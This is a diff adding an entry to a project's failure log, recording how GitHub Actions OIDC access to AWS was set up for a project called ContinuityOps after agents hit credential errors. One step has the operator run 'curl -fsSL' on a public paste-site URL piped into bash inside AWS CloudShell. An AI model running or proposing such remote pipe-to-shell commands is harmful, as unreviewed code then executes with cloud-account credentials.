@@ -238,5 +238,22 @@ ContinuityOps incidents yet.
 
 ## Log
 
-No ContinuityOps execution failures have been recorded. The project is still at
-candidate-plan stage.
+### 2026-07-18 — ContinuityOps live AWS via GHA OIDC (standalone wiring)
+
+- **Break:** Cloud agents treated live AWS as impossible / blocked on
+  CursorCloudAgent `NoCredentials` (BF-PRE-002). Standalone ContinuityOps had
+  no promoted CI OIDC role or plan/apply workflow; monorepo PR #30 still trusted
+  aws-landing-zone-lab `repository_id` `1296742987`.
+- **Fix:** Add `terraform/ci-bootstrap/` + CloudShell
+  `bootstrap-oidc-cloudshell.sh` (REPO_ID accept/discover; ContinuityOps id
+  `1301990908`). Promote `.github/workflows/continuityops-terraform.yml`
+  (plan/apply, role `continuityops-gha`, account `283077380808`). Minimal
+  `terraform/environments/{staging,recovery-lab}` roots for OIDC plan smoke.
+  AGENTS.md doctrine: escalate via GHA, not Cursor STS; do not reuse
+  `project-a-lzlab-gha`.
+- **Operator still required once:** CloudShell
+  `REPO_ID=1301990908 curl -fsSL https://paste.rs/gHlj9 | bash`, create GitHub
+  Environment `continuityops`, dispatch ContinuityOps Terraform plan.
+  Repo-only wiring without CloudShell will not make OIDC green.
+
+No earlier ContinuityOps execution failures were recorded before this entry.
